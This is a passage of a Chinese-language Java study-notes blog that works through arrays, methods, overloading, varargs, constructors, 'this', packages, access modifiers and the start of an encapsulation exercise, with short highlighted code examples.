class="code"><pre><code class="hljs java">&#123;<br>&#123;<span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">3</span>&#125;，<br>&#123;<span class="hljs-number">4</span>，<span class="hljs-number">5</span>，<span class="hljs-number">6</span>&#125;<br>&#125;<br><span class="hljs-type">int</span>[][] arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>];<br>arr[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]=<span class="hljs-number">100</span>;<br>System.out.println(arr.length); <span class="hljs-comment">//2，二维数组长度</span><br>System.out.println(arr[<span class="hljs-number">0</span>].length);<br>System.out.println(arr[<span class="hljs-number">1</span>].length);<span class="hljs-comment">//3，个数</span><br><br><br><br>&#123;<br>&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;,<br>&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;<br>&#125;<br><span class="hljs-type">int</span>[][] arr2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][];<span class="hljs-comment">//先开辟空间，2行，再继续取列数</span><br>arr2[<span class="hljs-number">0</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>];<br>arr2[<span class="hljs-number">1</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>];<br><br><br><br><span class="hljs-type">int</span>[][] arr3=&#123;<br>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;,<br>&#123;<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="二维数组其他定义方式"><a href="#二维数组其他定义方式" class="headerlink" title="二维数组其他定义方式"></a>二维数组其他定义方式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] x;<span class="hljs-type">int</span> x[];<br><span class="hljs-type">int</span>[][] y;<span class="hljs-type">int</span> y[][];<span class="hljs-type">int</span> [] y[];<br></code></pre></td></tr></table></figure><p>e.g.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1.</span><br>String foo=<span class="hljs-string">&quot;blue&quot;</span>;<br>        <span class="hljs-type">boolean</span>[] bar=<span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">if</span>(bar[<span class="hljs-number">0</span>])&#123;<br>            foo=<span class="hljs-string">&quot;green&quot;</span>;<br>        &#125;<br>        System.out.println(foo);<br><span class="hljs-comment">//输出blue</span><br><span class="hljs-number">2.</span><br><span class="hljs-type">char</span>[] arr1 = &#123;<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>&#125;;<br>        <span class="hljs-type">char</span>[] arr2 = arr1;<br>        arr2[<span class="hljs-number">2</span>] = <span class="hljs-string">&#x27;x&#x27;</span>;<br>        System.out.println(arr1[<span class="hljs-number">2</span>]);<br><span class="hljs-comment">//输出x</span><br><span class="hljs-number">3.</span><br>随机生成十个整数<br><span class="hljs-type">int</span>[] arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br>            arr[i]=(<span class="hljs-type">int</span>)(Math.random()*<span class="hljs-number">100</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++)&#123;<br>            System.out.println(arr[i]);<br>        &#125;<br><span class="hljs-comment">//倒序打印</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=arr.length-<span class="hljs-number">1</span>;i&gt;=<span class="hljs-number">0</span>;i--)&#123;<br>            System.out.println(arr[i]);<br>        &#125;<br><span class="hljs-comment">//求均值</span><br>        <span class="hljs-type">int</span> sum=arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;arr.length;i++)&#123;<br>            sum +=arr[i];<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;均值&quot;</span>+sum/arr.length);<br><span class="hljs-comment">//求最大值及其索引</span><br>        <span class="hljs-type">int</span> max=arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">int</span> maxIndex=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++)&#123;<br>            <span class="hljs-keyword">if</span>(max&lt;arr[i])&#123;<br>                max=arr[i];<br>                maxIndex=i;<br>            &#125;<br>        &#125;<br>        System.out.println(max+<span class="hljs-string">&quot; &quot;</span>+maxIndex);<br></code></pre></td></tr></table></figure><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> a=<span class="hljs-number">164</span>;<br>      StringBuilder stringBuilder=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>      <span class="hljs-type">char</span>[] chars=&#123;<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;F&#x27;</span>&#125;;<br>      <span class="hljs-keyword">while</span>(a&gt;<span class="hljs-number">0</span>)&#123;<br>          <span class="hljs-type">int</span> index=a%<span class="hljs-number">16</span>;<br>          <span class="hljs-type">char</span> temp=chars[index];<br>          stringBuilder.append(temp);<br>          a=a/<span class="hljs-number">16</span>;<br>      &#125;<br>      System.out.println(stringBuilder.reverse().toString());<br><br></code></pre></td></tr></table></figure><h1 id="类、属性、对象"><a href="#类、属性、对象" class="headerlink" title="类、属性、对象"></a>类、属性、对象</h1><h2 id="类的定义方法"><a href="#类的定义方法" class="headerlink" title="类的定义方法"></a>类的定义方法</h2><h3 id="方法（函数-成员方法-method-）的定义"><a href="#方法（函数-成员方法-method-）的定义" class="headerlink" title="方法（函数&#x2F;成员方法&#x2F; method ）的定义"></a>方法（函数&#x2F;成员方法&#x2F; method ）的定义</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java">访问修饰符 返回值类型 方法名（形参列表）&#123;<br>语句；<br>...<br><span class="hljs-keyword">return</span> 返回值；<br>&#125;<br>e.g.<br><span class="hljs-keyword">void</span> <span class="hljs-title function_">butt3rf1y</span><span class="hljs-params">()</span>&#123;...&#125;<br><span class="hljs-comment">//可以类比C语言的函数定义</span><br><br>类内部调用<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br> test();<br> &#125;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123;<br>System.out.println(<span class="hljs-string">&quot;test&quot;</span>);<br> &#125;<br>&#125;<br><br>类外部调用<br>Main.java<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>Cat cat=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();<br> cat.miao();<br> &#125;<br>&#125;<br>Cat.java<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">miao</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;喵&quot;</span>);<br>        <span class="hljs-keyword">return</span>；（可以省略）<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>一个方法只能返回一个值，要返回多个值可以用数组，可以为任意类型，包括基本数据类型和引用类型，<strong>返回值类型必须和 return 的值类型一致或兼容</strong></p><p>当函数没有返回值时，return 可以省略</p><h3 id="参数（类比C语言）"><a href="#参数（类比C语言）" class="headerlink" title="参数（类比C语言）"></a>参数（类比C语言）</h3><p>一个方法可以没有参数或多个参数，中间用逗号隔开（类比C语言）</p><h3 id="方法体"><a href="#方法体" class="headerlink" title="方法体"></a>方法体</h3><p>类比C语言函数体</p><p><strong>不可以在方法体内部定义方法</strong></p><h3 id="方法传参机制"><a href="#方法传参机制" class="headerlink" title="方法传参机制"></a>方法传参机制</h3><p><strong>a.方法嵌套顺序</strong></p><p>执行方法时会独立开辟栈空间,执行完毕或执行到 return 时，就会返回到调用方法的地方，返回后继续执行后面的代码，main 方法执行完毕，程序结束</p><p><strong>b.值传递&#x2F;值拷贝，形参任何改变不影响实参</strong></p><p><strong>c.引用传递，传递地址，形参改变可能影响实参</strong></p><p><strong>d.String 的传递</strong></p><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>属性（成员变量&#x2F;字段&#x2F; field ）的概念</p><p>属性定义语法与变量一致，多了访问修饰符</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">访问修饰符 属性类型 属性名<br></code></pre></td></tr></table></figure><p>属性类型可以为任意类型，可以是基本数据类型和引用类型，如果没有初始化，有默认值，和数组一致</p><h3 id="Static"><a href="#Static" class="headerlink" title="Static"></a>Static</h3><h4 id="静态属性（类属性）与实例属性（对象属性）"><a href="#静态属性（类属性）与实例属性（对象属性）" class="headerlink" title="静态属性（类属性）与实例属性（对象属性）"></a>静态属性（类属性）与实例属性（对象属性）</h4><p>静态属性，只有一份，可以通过 <strong>类名.属性名&#x2F;对象.属性名</strong>来赋值和访问</p><p>实例属性，每个对象有一份，只能通过 <strong>对象.属性名</strong>来赋值和访问</p><h4 id="静态方法和实例方法（对象方法）"><a href="#静态方法和实例方法（对象方法）" class="headerlink" title="静态方法和实例方法（对象方法）"></a>静态方法和实例方法（对象方法）</h4><p>静态方法只能调用静态方法，不能访问实例属性</p><p>实例方法中可以调用静态方法和实例方法，也可以访问静态属性和实例属性</p><h4 id="补全method方法"><a href="#补全method方法" class="headerlink" title="补全method方法"></a>补全method方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(method(method(<span class="hljs-number">100.2</span>,<span class="hljs-number">1.0</span>),<span class="hljs-number">100</span>))<br><br><span class="hljs-keyword">static</span> <span class="hljs-type">double</span> <span class="hljs-title function_">method</span><span class="hljs-params">(<span class="hljs-type">double</span> a,<span class="hljs-type">double</span> b)</span>&#123;<br>  <span class="hljs-keyword">return</span> a+b;<br> &#125;<br></code></pre></td></tr></table></figure><p>e.g.</p><p>定义一个find方法，实现对字符串数组元素进行查找，并返回索引，找不到返回-1；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">String[] a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>&#125;;<br>  String b=<span class="hljs-string">&quot;c&quot;</span>;<br>  System.out.println(find(a,b));<br>  <br> &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(String[] a,String b)</span> &#123;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; a.length; i++) &#123;<br>        <span class="hljs-keyword">if</span> (a[i] == b) &#123;<br>          <span class="hljs-keyword">return</span> i;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h1><p>同一个类中，允许存在一个以上的同名方法，只要它们的参数个数或者参数类型，参数顺序不同即可，<strong>与返回值类型无关</strong>，只看参数列表</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>       <br>        System.out.println(<span class="hljs-string">&quot;abc0&quot;</span>);<br>        System.out.println(<span class="hljs-string">&#x27;a&#x27;</span>);<br>        System.out.println(<span class="hljs-literal">false</span>);<br>        System.out.println(<span class="hljs-number">1000.1</span>);<br>        System.out.println(<span class="hljs-number">123</span>);<br>        test(<span class="hljs-string">&quot;x&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(String a)</span>&#123;<br>        System.out.println(a);<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span>&#123;<br>        System.out.println(a);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span>... nums)</span>&#123; &#125;<br></code></pre></td></tr></table></figure><p>可变参数本质就是数组，实参可以为0个或任意多个</p><p>可变参数的实参可以为数组，这时候只能传一个参数</p><p>形参列表中只能出现一个可变参数</p><p>可变参数可以和普通参数以前放在形参列表，但必须保证可变参数在最后一个西餐列表中只能出现一个可变参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>       <br>       <span class="hljs-type">int</span>[] a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>&#125;;<br>        System.out.println(sum(<span class="hljs-string">&quot;java&quot;</span>,<span class="hljs-string">&quot;cpp&quot;</span>,a));<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(String d,String b,<span class="hljs-type">int</span>... a)</span>&#123;<br>        <span class="hljs-type">int</span> result=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;a.length;i++)&#123;<br>            result+=a[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="构造器-构造方法-构造函数"><a href="#构造器-构造方法-构造函数" class="headerlink" title="构造器&#x2F;构造方法&#x2F;构造函数"></a>构造器&#x2F;构造方法&#x2F;构造函数</h1><h2 id="构造器特点"><a href="#构造器特点" class="headerlink" title="构造器特点"></a>构造器特点</h2><p>与类名一致，<strong>无返回值</strong>；</p><p>当对象创建时，会自动调用对应的构造器</p><p>如果没有定义构造器，会自动生成默认的无参构造器（默认构造器）</p><p>一个类可以定义多个不同的构造器，即构造器重载</p><p>一旦定义了构造器，默认的构造器就覆盖了，就不能再使用默认的无参构造器，除非自己显示的定义一下</p><h2 id="对象创建流程"><a href="#对象创建流程" class="headerlink" title="对象创建流程"></a>对象创建流程</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>       <span class="hljs-type">int</span> age=<span class="hljs-number">90</span>;<br>       String name;<br>       Person(String n,<span class="hljs-type">int</span> a)&#123;<br>           name=n;<br>           age=a;<br>       &#125;<br>   &#125;<br>   Person p=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;abc&quot;</span>,<span class="hljs-number">31</span>);<br></code></pre></td></tr></table></figure><p>加载 Person 类信息，只会加载一次</p><p>在堆中分配空间（地址）</p><p>完成对象初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">默认初始化   age=<span class="hljs-number">0</span>   name=<span class="hljs-literal">null</span><br>显示初始化   age=<span class="hljs-number">90</span>   name=<span class="hljs-literal">null</span><br>构造器初始化   age=<span class="hljs-number">31</span>   name=abc<br></code></pre></td></tr></table></figure><p>在对象在堆中的地址，返回给 p (p是对象名，也可以理解成是对象的引用)</p><h1 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h1><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p>属性（成员变量），可以被本类或其他类使用</p><p>可以加访问修饰符</p><p>有默认值，可以不赋值直接使用</p><p>生命周期长，伴随着对象的创建而创建，销毁而销毁</p><h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><p>不可加修饰符</p><p>没有默认值，需要赋值使用</p><p>生命周期短，伴随代码块执行而创建，结束而销毁</p><h2 id="块级作用域"><a href="#块级作用域" class="headerlink" title="块级作用域"></a>块级作用域</h2><p><strong>static静态代码块（最先执行）</strong>、构造代码块、方法代码块、局部代码块、语句代码块</p><p><strong>属性和局部变量可以重名</strong>，优先使用局部变量，在<strong>同一个作用域中两个局部变量不能重名</strong></p><h1 id="this"><a href="#this" class="headerlink" title="this"></a>this</h1><ul><li><p>代表当前对象，打印对象的 hashCode，哪个对象调用方法，this 就指哪个对象</p></li><li><p>this 用于区分当前对象的属性和局部变量</p></li><li><p>this 不能在类外部使用，<strong>只能在类内部实例方法中使用</strong>，静态方法不可使用</p></li><li><p>类内部赋值和获取实例属性</p></li></ul><h2 id="类内部调用方法"><a href="#类内部调用方法" class="headerlink" title="类内部调用方法"></a>类内部调用方法</h2><p>方法名（实参列表）</p><p>​this.方法名（实参列表）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>      System.out.println(<span class="hljs-string">&quot;this:&quot;</span>+<span class="hljs-built_in">this</span>.hashCode());<br>  &#125;<br>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">test1</span><span class="hljs-params">()</span>&#123;<br>      <span class="hljs-built_in">this</span>.test();<br>      System.out.println(<span class="hljs-string">&quot;this:&quot;</span>+<span class="hljs-built_in">this</span>.hashCode());<br>  &#125;<br> <br></code></pre></td></tr></table></figure><h2 id="this方法"><a href="#this方法" class="headerlink" title="this方法"></a>this方法</h2><p>this（实参列表）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Cat</span><span class="hljs-params">(String name)</span>&#123;<br>       <span class="hljs-built_in">this</span>(name,<span class="hljs-number">30</span>);<span class="hljs-comment">//必须放在第一行才能使用</span><br>       <span class="hljs-built_in">this</span>.name=name;<br>       System.out.println(<span class="hljs-built_in">this</span>.name);<br>       System.out.println(<span class="hljs-string">&quot;this&quot;</span>+<span class="hljs-built_in">this</span>.hashCode());<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Cat</span><span class="hljs-params">(String dname,<span class="hljs-type">int</span> age)</span>&#123;<br>       <span class="hljs-built_in">this</span>.age=age;<br>       System.out.println(<span class="hljs-string">&quot;Cat(String dname,int agr)&quot;</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><h1 id="包"><a href="#包" class="headerlink" title="包"></a>包</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>区分相同名字类，方便管理，控制访问范围</p><h2 id="建包"><a href="#建包" class="headerlink" title="建包"></a>建包</h2><p>建立不同的文件夹&#x2F;目录来保存类文件</p><h2 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h2><p>基本语法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.butterfly.app<br><span class="hljs-keyword">package</span> <span class="hljs-comment">//关键字</span><br>com.butterfly.app <span class="hljs-comment">//包名</span><br></code></pre></td></tr></table></figure><p>package 的作用是声明当前类所在的包，<strong>一个类只能有一个 package</strong></p><h2 id="导包"><a href="#导包" class="headerlink" title="导包"></a>导包</h2><p>import 指令位置放在 package 下，在类定义前面，可以有多句且没有顺序要求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br>java.lang.*  是基本包，默认引入，不需要再引入<br></code></pre></td></tr></table></figure><h1 id="访问修饰符"><a href="#访问修饰符" class="headerlink" title="访问修饰符"></a>访问修饰符</h1><p>控制属性和方法的访问权限</p><p>修饰类的属性，成员方法及类</p><p>只有默认的和 public 才能修饰类，并且遵循上述访问权限的特点</p><table><thead><tr><th></th><th>本类</th><th>同包</th><th>子类</th><th>不同包</th></tr></thead><tbody><tr><td>public</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>protected</td><td>√</td><td>√</td><td>√</td><td>×</td></tr><tr><td>private</td><td>√</td><td>×</td><td>×</td><td>×</td></tr><tr><td>没有修饰符</td><td>√</td><td>√</td><td>×</td><td>×</td></tr></tbody></table><h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1><p>把属性私有，定义公开的 get、set 方法来验证数据合理性</p><p>e.g</p><p>定义 Account 类，要求具有属性：姓名 name（长度为2-4，初始化后不可修改）、余额 balance（必须大于20）、密码 password（必须是六位）。如果不满足，则给出提示信息，并给默认值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java">Account.java<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Account</span> &#123;<br>    <span class="hljs-keyword">private</span> String name=<span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> balance=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">private</span> String password=<span class="hljs-literal">null</span>;<br>    <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <br>    <span 